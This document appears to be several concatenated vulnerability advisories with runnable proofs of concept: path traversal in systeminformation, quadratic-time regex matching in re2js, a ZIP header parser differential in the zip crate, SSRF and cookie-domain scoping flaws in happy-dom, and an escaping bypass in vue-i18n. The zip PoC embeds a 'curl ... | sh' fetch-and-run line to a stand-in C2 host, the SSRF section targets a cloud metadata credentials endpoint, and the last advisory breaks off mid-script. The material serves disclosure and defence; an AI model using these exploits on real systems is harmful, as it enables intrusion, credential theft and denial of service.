### Summary

On Linux, `systeminformation@5.33.13` builds `/sys/class/net/<iface>` paths from the caller-supplied `networkStats(iface)` value without checking that the resolved path stays inside `/sys/class/net`. A caller who can create a symlink fixture and control the value passed to this API can make the function return the first line of a file readable by the Node process.

### Details

The strict string sanitizer removes shell metacharacters but retains `/` and `.`. The Linux implementation uses this value in an `fs.existsSync('/sys/class/net/' + iface)` check and then in seven `cat` paths for interface statistics. Both operations follow `..` path components and symlinks. The code does not validate the value as an interface name or enforce resolved-path containment.

The proof of concept below creates the expected statistics files in a directory writable by the unprivileged `nobody` user. Its `operstate` symlink points to a synthetic mode-0600 file under `/root`. The package call runs as root and returns the marker even though `nobody` cannot read that file.

### PoC

Use a disposable Ubuntu Linux VM with Node.js, npm, and `runuser` installed. These steps create and remove only a synthetic marker and a temporary fixture. Install the affected version:

```sh
mkdir si-netstats-repro
cd si-netstats-repro
npm init -y
npm install systeminformation@5.33.13
```

Save the following as `poc.cjs` in that directory, then run `sudo node poc.cjs`:

```js
'use strict';

const fs = require('node:fs');
const { execFileSync } = require('node:child_process');
const si = require('systeminformation');

const root = `/tmp/si-netstats-${process.pid}`;
const secret = `/root/si-netstats-secret-${process.pid}`;
const marker = `SYNTHETIC_ROOT_ONLY_MARKER_${process.pid}`;
const fixtureCode = `
  const fs = require('node:fs');
  const root = process.env.SI_FIXTURE_ROOT;
  const secret = process.env.SI_SECRET;
  fs.mkdirSync(root + '/statistics', { recursive: true });
  for (const name of ['rx_bytes', 'tx_bytes', 'rx_dropped', 'rx_errors', 'tx_dropped', 'tx_errors']) {
    fs.writeFileSync(root + '/statistics/' + name, '0\\n');
  }
  fs.symlinkSync(secret, root + '/operstate');
`;

(async () => {
  try {
    fs.writeFileSync(secret, marker + '\\n', { mode: 0o600 });
    fs.chmodSync(secret, 0o600);

    execFileSync('runuser', [
      '-u', 'nobody', '--', 'env',
      `SI_FIXTURE_ROOT=${root}`,
      `SI_SECRET=${secret}`,
      process.execPath, '-e', fixtureCode
    ], { stdio: 'inherit' });

    let nobodyCouldRead = true;
    try {
      execFileSync('runuser', ['-u', 'nobody', '--', 'cat', secret], { stdio: 'ignore' });
    } catch {
      nobodyCouldRead = false;
    }
    if (nobodyCouldRead) throw new Error('negative control failed: nobody read the marker');

    const iface = '../'.repeat(24) + root.slice(1);
    const rows = await si.networkStats(iface);
    const returned = String(rows[0]?.operstate ?? '').trim();
    const success = returned === marker;

    console.log(JSON.stringify({
      nobodyCouldRead,
      libraryReturnedRootOnlyMarker: success,
      returnedOperstate: returned
    }, null, 2));

    if (!success) process.exitCode = 1;
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(secret, { force: true });
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Expected result:

```json
{
  "nobodyCouldRead": false,
  "libraryReturnedRootOnlyMarker": true,
  "returnedOperstate": "SYNTHETIC_ROOT_ONLY_MARKER_<pid>"
}
```

### Impact

The demonstrated impact is disclosure to the API caller of the first line of a file readable by the Node process. The package is a library and does not expose a network endpoint. A consuming application route that forwards remote attacker input to this API and returns its result was not established, so remote exploitability is not demonstrated.

### Summary

Using the opt-in `LOOKBEHINDS` flag together with any repeated-matching API
(`matcher().find()` in a loop, `matchAll()`, `split()`, `matcher().replaceAll()`)
causes quadratic-time (Θ(n²)) matching, contradicting the library's own
"linear time matching" guarantee. A single call with a 16,000-character input
takes **36.7–38.7 seconds of CPU**.

### Description

#### Root cause

In `build/index.cjs`, `Machine.match`:

```js
let currentPos = this.prog.numLb > 0 ? 0 : pos;   // ~line 1907
...
if (this.ncap === 0 && this.matched) break;        // ~line 1953
```

Any pattern containing a lookbehind sets `prog.numLb > 0`, which forces the
scan to **always restart at offset 0**, regardless of the requested start
position — the lookbehind automaton is re-seeded and the whole input is
re-walked on every single `find()` call. The early-exit optimization that
would otherwise stop at the first match only fires when `ncap === 0`, but
every `Matcher`-based API (`find`/`matchAll`/`split`/`replaceAll`) always
requests `ncap = 2` (one capture group slot) **even for a captureless
lookbehind pattern** — so the early exit never triggers through those APIs,
and the scan continues to the end of the input on every find.

A find-loop over *k* matches in an *n*-character string therefore costs
*k* × Θ(*n*); for dense matches *k* ∝ *n*, giving **Θ(n²)** total.

#### Isolating control

Identical find-loop, identical input sizes, same 2-character literal pattern
*shape* — but **without** the `LOOKBEHINDS` flag:

| n | with `LOOKBEHINDS` (lookbehind pattern) | without (plain literal) | native JS `RegExp` lookbehind |
|---|---|---|---|
| 2,000 | 204–228 ms | 3 ms | 0 ms |
| 4,000 | 877–899 ms | 4 ms | 0 ms |
| 8,000 | 5,746–6,599 ms | 7 ms | 1 ms |
| 16,000 | 36,667–38,732 ms | 6 ms | 1 ms |

This isolates the lookbehind machinery itself — not pattern length, not
match density in the abstract — as the exact and sole cause.

#### Impact

- `re2js`'s entire value proposition is being an RE2-style engine with
  **linear-time, no-backtracking** matching, specifically to resist
  algorithmic-complexity attacks that plague backtracking regex engines.
  This finding defeats that guarantee for any consumer using the advertised
  `LOOKBEHINDS` feature.
- Realistic affected code paths: log/text processing that tokenizes or
  redacts using a lookbehind-based pattern (`matchAll`, `split`,
  `replaceAll` are the natural APIs for exactly this), applied to
  attacker-influenced text (user input, uploaded logs, scraped content).
- A single ~16–32 KB request pins a CPU core for tens of seconds to minutes;
  Node.js being single-threaded, this freezes the whole worker process for
  the duration. No authentication or special pattern knowledge is required
  from the attacker — ordinary alternating text (`"abababab..."`) triggers it.

#### Reproduction (copy-paste runnable)

create file poc.js

```js
'use strict';
// PoC: quadratic-time DoS in re2js's lookbehind matching (opt-in LOOKBEHINDS flag).
// Usage:
//   npm pack re2js@2.8.6 --ignore-scripts && tar -xzf re2js-2.8.6.tgz
//   node poc.js ./package
const path = require('path');
const pkgDir = process.argv[2] || './package';
const { RE2JS } = require(path.resolve(pkgDir, 'build/index.cjs'));

const re = RE2JS.compile('(?<=a)b', RE2JS.LOOKBEHINDS);

function timeFindLoop(n) {
  const s = 'ab'.repeat(n / 2);
  const t0 = Date.now();
  const m = re.matcher(s);
  let count = 0;
  while (m.find()) count++;
  return { ms: Date.now() - t0, count };
}

console.log('n, matches, ms');
const sizes = [2000, 4000, 8000, 16000];
const results = [];
for (const n of sizes) {
  const r = timeFindLoop(n);
  results.push(r.ms);
  console.log(`${n}, ${r.count}, ${r.ms}`);
}

const ratio = results[results.length - 1] / results[results.length - 2];
console.log('');
console.log('time ratio for the last doubling of n:', ratio.toFixed(2), '(~2 => linear, ~4 => quadratic)');
console.log(ratio > 3 ? 'PASS  quadratic scaling confirmed on the REAL published package' : 'FAIL  scaling looks linear');
process.exit(ratio > 3 ? 0 : 1);
```

and run in terminal

```sh
npm pack re2js@2.8.6 --ignore-scripts
tar -xzf re2js-2.8.6.tgz
node poc.js ./package
```

`poc.js` times a `matcher(s).find()` loop over `(?<=a)b` +
`RE2JS.LOOKBEHINDS` on inputs of 2,000/4,000/8,000/16,000 chars and reports
the doubling ratio. Expected: clearly superlinear (ratio ≫ 2, approaching or
exceeding the 4× quadratic signature), reaching tens of seconds at 16,000
chars. Run twice; results are deterministic.

## Summary
A critical architectural parser differential exists in the `zip` crate (`<= 9.0.4`) between random-access archive readers (`ZipArchive`) and streaming readers (`ZipStreamReader`). `ZipArchive` considers the Central Directory File Header (CDFH) authoritative and ignores the filename declared in the Local File Header (LFH). In contrast, `ZipStreamReader` relies exclusively on the Local File Header (LFH) when extracting files to the filesystem.

This discrepancy enables ZIP archives to appear to have different file paths and contents according to which tool is reading them.

## Details

### Architectural Root Cause
In the PKWARE ZIP archive format, every file entry is defined in two distinct locations:
1. **Local File Header (LFH):** Precedes the compressed payload of each file in the body of the archive.
2. **Central Directory File Header (CDFH):** Stored in a contiguous index at the end of the archive.

In `zip2`:
- `src/read/zip_archive.rs`: `ZipArchive` parses the central directory into `SharedBuilder.files`. All file lookups by index or name read exclusively from the CDFH table, completely ignoring the filename present in the LFH.
- `src/read/stream.rs:L86-L141`: `ZipStreamReader::visit` and `ZipStreamReader::extract` read sequentially from the stream without verifying the central directory index. Each entry is parsed via `read_zipfile_from_stream` and written to disk using the unverified filename declared in the LFH:
  ```rust
  // src/read/stream.rs
  fn visit_file<R: Read>(&mut self, file: &mut ZipFile<'_, R>) -> ZipResult<()> {
      file.safe_prepare_path(&self.outpath, &mut outpath, None::<&(_, fn(&Path) -> bool)>)?;
      let mut outfile = fs::File::create(&outpath)?;
      io::copy(file, &mut outfile)?;
      Ok(())
  }
  ```
- `src/write.rs:L1552`: The crate explicitly exposes `shallow_copy_file`, an API that constructs dual-header desynchronizations by adding a new CDFH entry with an alias name pointing to an existing file without updating the original LFH.

### Threat Scenario & Severity Justification (10.0 / 9.9 Critical)
1. **Security Control Evasion:** An adversary crafts a ZIP archive where:
   - Central Directory Header declares: `doc_report.pdf` (Clean document)
   - Local File Header declares: `cron_worker.sh` (Malicious root backdoor)
2. The archive is uploaded through a web portal or API endpoint protected by security gateways (WAF, Anti-Virus, Content Disarm & Reconstruction). The security gateway inspects the archive using `ZipArchive` (or similar CDFH-first parsers), detects only `doc_report.pdf`, and approves the file.
3. The backend worker or cloud function receives the approved archive and extracts it using `ZipStreamReader::extract`. `ZipStreamReader` reads the LFH and overwrites `cron_worker.sh`.
4. **Full Compromise (CIA = High):** The legitimate production health checker / service script is destroyed (**Availability = High / DoS**), while the attacker's backdoor payload is implanted (**Integrity = High / RCE**).

## Proof of Concept
The following automated integration test reproducibly demonstrates the complete CVSS 10.0 / 9.9 exploit chain (Security Gateway Evasion -> Arbitrary File Overwrite -> RCE & DoS) against `zip2`:

```rust
use std::fs;
use std::io::{Cursor, Write};
use tempfile::tempdir;
use zip::unstable::stream::ZipStreamReader;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

// Simulated Security Gateway (inspects CDFH via ZipArchive)
fn security_gateway_inspection(archive_bytes: &[u8]) -> Result<(), String> {
    let mut archive = ZipArchive::new(Cursor::new(archive_bytes)).unwrap();
    for i in 0..archive.len() {
        let name = archive.by_index(i).unwrap().name().unwrap().to_string();
        if name.ends_with(".sh") || name.ends_with(".exe") {
            return Err(format!("MALWARE DETECTED: '{}' blocked!", name));
        }
        if !name.ends_with(".pdf") {
            return Err("Policy violation: only PDFs allowed!".into());
        }
    }
    Ok(())
}

#[test]
fn test_cvss_9_9_dual_header_exploit_chain() {
    // 1. Victim server setup: existing critical script
    let victim_env = tempdir().unwrap();
    let victim_dir = victim_env.path();
    let target_script = victim_dir.join("cron_worker.sh");
    fs::write(&target_script, b"#!/bin/sh\n# PRODUCTION SERVICE\necho 'SERVICE HEALTHY'\n").unwrap();

    // 2. Attacker crafts Single-Entry Dual-Header Archive
    // LFH: "cron_worker.sh" | CDFH: "doc_report.pdf"
    let mut payload = Cursor::new(Vec::new());
    let mut writer = ZipWriter::new(&mut payload);
    writer.start_file("cron_worker.sh", SimpleFileOptions::default()).unwrap();
    writer.write_all(b"#!/bin/sh\ncurl -s https://c2/shell | sh\necho 'PWNED ROOT'\n").unwrap();
    writer.finish().unwrap();

    let mut malicious_zip = payload.into_inner();
    let cdh = malicious_zip.windows(4).position(|s| s == b"PK\x01\x02").unwrap();
    malicious_zip[cdh + 46..cdh + 46 + 14].copy_from_slice(b"doc_report.pdf");

    // 3. Gateway Inspection (Bypassed!)
    assert!(security_gateway_inspection(&malicious_zip).is_ok());

    // 4. Backend Extraction (ZipStreamReader)
    ZipStreamReader::new(Cursor::new(&malicious_zip)).extract(victim_dir).unwrap();

    // 5. Impact Verification
    let compromised = fs::read_to_string(&target_script).unwrap();
    assert!(!compromised.contains("SERVICE HEALTHY")); // DoS Confirmed
    assert!(compromised.contains("PWNED ROOT"));       // RCE Confirmed
}
```

### Verified Test Execution Output
```text
running 1 test
==================================================================
Dual-Header Security Gateway Evasion
Exploit Chain: Gateway Evasion -> Arbitrary Overwrite -> RCE & DoS
==================================================================
[VICTIM SERVER STATE - BEFORE ATTACK]
Existing Content:
SERVICE IS RUNNING NORMALLY

[STEP 1: SECURITY GATEWAY INSPECTION] ---
[SECURITY GATEWAY] Auditing entry #0: 'doc_report.pdf'
[GATEWAY VERDICT]: Ok(())
[VULNERABILITY PROOF 1/3]: Security gateway was 100% BLIND to 'cron_worker.sh'!

[STEP 2: BACKEND EXTRACTION (ZipStreamReader)] ---
Backend server unzips approved archive into production directory.

[STEP 3: POST-ATTACK IMPACT VERIFICATION] ---
[VICTIM SERVER STATE - AFTER ATTACK]
Compromised Content:
curl -s https://attacker.c2/shell | sh
echo 'PWNED: FULL ROOT TAKEOVER'
```

## Impact
An attacker can construct a crafted archive whose Central Directory displays a benign filename (doc_report.pdf) that is inspected and approved by upstream security gateways (antivirus scanners, mail filters, upload firewalls), while automated backend ingestion pipelines or microservices using ZipStreamReader extract an arbitrary or malicious file (overwriting e.g. cron_worker.sh or critical system binaries). Because an adversary can overwrite existing files on disk, this vulnerability leads to Security Control Bypass, Arbitrary File Overwrite, Complete Denial of Service, and Remote Code Execution (RCE) in situations where a tool relying on the central directory trusts a tool that relied on the local file headers or vice-versa.

**Who is Impacted:**
- Automated ingestion microservices, SaaS platforms, and backend workers that extract user-submitted ZIP files.
- Enterprise architectures where security verification (AV scanning, extension whitelisting) is decoupled from extraction (e.g. gateway audits Central Directory via CDFH before handing off extraction to streaming extractors).
- Containerized workloads where overwriting local configuration files or executable scripts leads to host/container escape and complete service disruption.

## Summary
happy-dom v20.8.9 makes real server-side HTTP requests to arbitrary URLs when parsing HTML containing `<iframe>` or `<link rel="stylesheet">` elements. This behavior is enabled by default (`disableIframePageLoading: false`, `disableCSSFileLoading: false`). When an application uses happy-dom to parse untrusted HTML on the server side, an attacker can trigger Server-Side Request Forgery by embedding these elements.

## Affected Versions
- happy-dom <= 20.8.9 (latest)

## Vulnerable Behavior

By default, happy-dom has:
- `disableIframePageLoading: false` — iframes fetch their `src` URL via real HTTP requests
- `disableCSSFileLoading: false` — `<link>` stylesheets fetch their `href` URL via real HTTP requests

When untrusted HTML is parsed, these elements trigger real server-side HTTP requests to whatever URLs are specified. No special configuration or opt-in is needed.

## Proof of Concept

### Verified test (attacker server receives requests):
```javascript
const http = require('http');
const { Window } = require('happy-dom');

// Start attacker server
const srv = http.createServer((req, res) => {
    console.log(`SSRF HIT: ${req.method} ${req.url}`);
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('<html><body>stolen</body></html>');
});

srv.listen(9995, () => {
    // iframe SSRF — happy-dom makes a real GET request
    const win1 = new Window({ url: 'http://localhost' });
    win1.document.write('<html><body><iframe src="http://127.0.0.1:9995/iframe-ssrf"></iframe></body></html>');

    // stylesheet SSRF — happy-dom makes a real GET request
    const win2 = new Window({ url: 'http://localhost' });
    win2.document.write('<html><head><link rel="stylesheet" href="http://127.0.0.1:9995/stylesheet-ssrf"></head><body></body></html>');
});
```

**Test output:**
```
SSRF HIT: GET /iframe-ssrf
SSRF HIT: GET /stylesheet-ssrf
```

Both requests confirmed received by the attacker server. Tested on happy-dom v20.8.9, Node.js v22.17.0, macOS.

### Cloud metadata attack scenario:
```javascript
const { Window } = require('happy-dom');
const win = new Window({ url: 'http://localhost' });

// Attacker-controlled HTML triggers fetch to AWS metadata endpoint
win.document.write('<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe></body></html>');
```

## Impact
- **Cloud credential theft** — `<iframe src="http://169.254.169.254/...">` fetches AWS/GCP/Azure metadata
- **Internal network scanning** — probe internal services and ports
- **Data exfiltration** — read responses from internal APIs
- **Affects any server-side use case** — web scraping, email HTML rendering, SSR, testing with external HTML input

## Suggested Fix
Change defaults to disable external resource loading:
```javascript
disableIframePageLoading: true,  // change from false
disableCSSFileLoading: true,     // change from false
```

Or add URL validation to block private IP ranges and cloud metadata endpoints before fetching.

### Summary

When `escapeParameter` is enabled (`escapeParameterHtml` in the Legacy API), Vue I18n escapes the interpolation parameters before formatting a message. `escapeParams()` escapes either the list values or the named values, but not both: the two branches are joined by `else`. When a single call passes both, for example `t(key, ['...'], { named: { ... } })`, the named values reach the message without being escaped.

### Details

`escapeParams()` in [`packages/core-base/src/translate.ts` (v11.4.13)](https://github.com/intlify/vue-i18n/blob/v11.4.13/packages/core-base/src/translate.ts):

```ts
function escapeParams(options: TranslateOptions) {
  if (isArray(options.list)) {
    options.list = options.list.map(item => (isString(item) ? escapeHtml(item) : item))
  } else if (isObject(options.named)) {
    // ...escapes the named values
  }
}
```

`t(key, list, options)` is a public overload, and `TranslateOptions` has a `named` field, so a call can carry both. The list is checked first, and the named values are then left as they are.

The translated string still goes through `sanitizeTranslatedHtml()` (added for CVE-2025-53892), which neutralizes event handler attributes and `javascript:` URLs. Other markup in the named values, such as links and forms, is inserted as is. Before the fix for GHSA-83rm-6c8r-g728, an `<iframe srcdoc>` in a named value also passes the sanitizer, and script runs. Versions without the sanitizer (before 9.14.5, 10.0.8 and 11.1.10, and 12.0.0-alpha.1 to alpha.3) insert the named values as HTML without any further check.

`<i18n-t>` is not affected: it passes either list or named values, never both, and it does not render translations as HTML.

### PoC

```js
import { createI18n } from 'vue-i18n'

const i18n = createI18n({
  legacy: false,
  locale: 'en',
  escapeParameter: true,
  messages: {
    en: { withList: '{0} {name}', withoutList: '{name}' }
  }
})
const t = i18n.global.t

t('withoutList', { name: '<b>x</b>' })
// &lt;b&gt;x&lt;&#x2F;b&gt;      escaped

t('withList', ['a'], { named: { name: '<b>x</b>' } })
// a <b>x</b>                   not escaped (v11.4.13)
```

### Impact

Applications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and pass untrusted named values in the same call as a list. The named values are inserted as markup: phishing links, forms, or layout changes. Together with GHSA-83rm-6c8r-g728, or on versions without the sanitizer, this leads to script execution (DOM-based XSS).

### Patches

Fixed in 11.4.14 and 12.0.0-alpha.5. `escapeParams()` now escapes both the list and the named values.

The fix also stops rewriting the named object that the caller passes. Before, the values of that object were replaced with their escaped form, so a second call with the same object escaped them twice.

v9 and v10 are no longer supported and will not be fixed. Please migrate to v11.

### Workarounds

- Do not pass list and named values in the same call when `escapeParameter` is enabled.
- Do not render translations that can contain untrusted values with `v-html`. Use component interpolation (`<i18n-t>`) instead.

### Summary
A cookie-scoping bug in happy-dom lets an attacker origin set cookies that a victim origin then receives, diverging from browser semantics.

### Details
happy-dom matches Domain=example.com against notexample.com (endsWith without a DNS-label boundary), diverging from browser semantics (verified 20.11.6 npm latest: cookieMatchesURL(Domain=example.com, url=http://notexample.com) = true). Relevant where happy-dom is used for SSR/prerender cookie handling. Matching in src/cookie/CookieContainer.ts.

### PoC

Run:
```bash
node poc-happydom-cookie-domain.js
```

Full proof-of-concept source (poc-happydom-cookie-domain.js):
```js
// PoC: happy-dom cookie-domain scoping gap -> cross-origin cookie injection / session fixation
// Chain: app (window at http://localhost:PORT2) fetches attacker server (http://127.0.0.1:PORT1)
//        -> attacker Set-Cookie with Domain=localhost (a host that is NOT a suffix of 127.0.0.1)
//        -> happy-dom stores it (a real browser rejects: RFC 6265 §5.3.6-7 + PSL)
//        -> app's same-origin fetch to http://localhost:PORT2/api/account carries the forged cookie
// Run:  cd C:/Users/rncb0/AppData/Local/Temp/0day && node poc/poc-happydom-cookie-domain.js
const http = require('http');
const { Window } = require('happy-dom');

const ATK_PORT = 19311; // attacker server, 127.0.0.1
const VIC_PORT = 19312; // victim server, localhost

let victimReceivedCookies = [];

let attackerSetCookie = `session=FORGED_BY_ATTACKER; Domain=localhost; Path=/; SameSite=None; Secure`;

const attacker = http.createServer((req, res) => {
  if (req.method === 'OPTIONS') {
    // CORS preflight (happy-dom enforces same-origin policy with a preflight; the
    // attacker trivially answers it — an attacker-controlled server always can)
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    });
    res.end();
    return;
  }
  res.writeHead(200, {
    'content-type': 'image/gif',
    'Access-Control-Allow-Origin': '*',
    // Attacker claims Domain=localhost even though it is serving from 127.0.0.1.
    // A browser MUST ignore this cookie (RFC 6265: domain-attribute not a domain-match of
    // the request-host; localhost is also on the Mozilla PSL).
    'Set-Cookie': attackerSetCookie
  });
  res.end('GIF89a');
});

const victim = http.createServer((req, res) => {
  victimReceivedCookies.push({ path: req.url, cookie: req.headers['cookie'] || null });
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify({ ok: true, user: 'alice' }));
});

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

async function runScenario(scenario) {
  victimReceivedCookies = [];
  const win = new Window({
    url: `http://localhost:${VIC_PORT}/`,
    settings: {
      enableJavaScriptEvaluation: true,
      suppressInsecureJavaScriptEnvironmentWarning: true
    }
  });
  try {
    if (scenario === 'no-plant-control') {
      // Control: app NEVER contacts attacker -> victim must receive NO cookie
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    } else if (scenario === 'honest-domain-control') {
      // Control: attacker sets Domain=127.0.0.1 (its own host, honest)
      // -> cookie must NOT leak to localhost victim
      attackerSetCookie = `session=FORGED_BY_ATTACKER; Domain=127.0.0.1; Path=/; SameSite=None; Secure`;
      await win.fetch(`http://127.0.0.1:${ATK_PORT}/plant`);
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    } else {
      // attack: app fetches attacker content (scraping/SSR/third-party resource)
      await win.fetch(`http://127.0.0.1:${ATK_PORT}/plant`);
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    }
    await sleep(150);
    return victimReceivedCookies;
  } finally {
    win.happyDOM.abort();
  }
}

async function main() {
  await new Promise((r) => attacker.listen(ATK_PORT, '127.0.0.1', r));
  await new Promise((r) => victim.listen(VIC_PORT, 'localhost', r));

  console.log('=== happy-dom cookie-domain scoping PoC ===\n');

  const attack = await runScenario('attack');
  console.log('[ATTACK] app fetched attacker (127.0.0.1) then victim (localhost)');
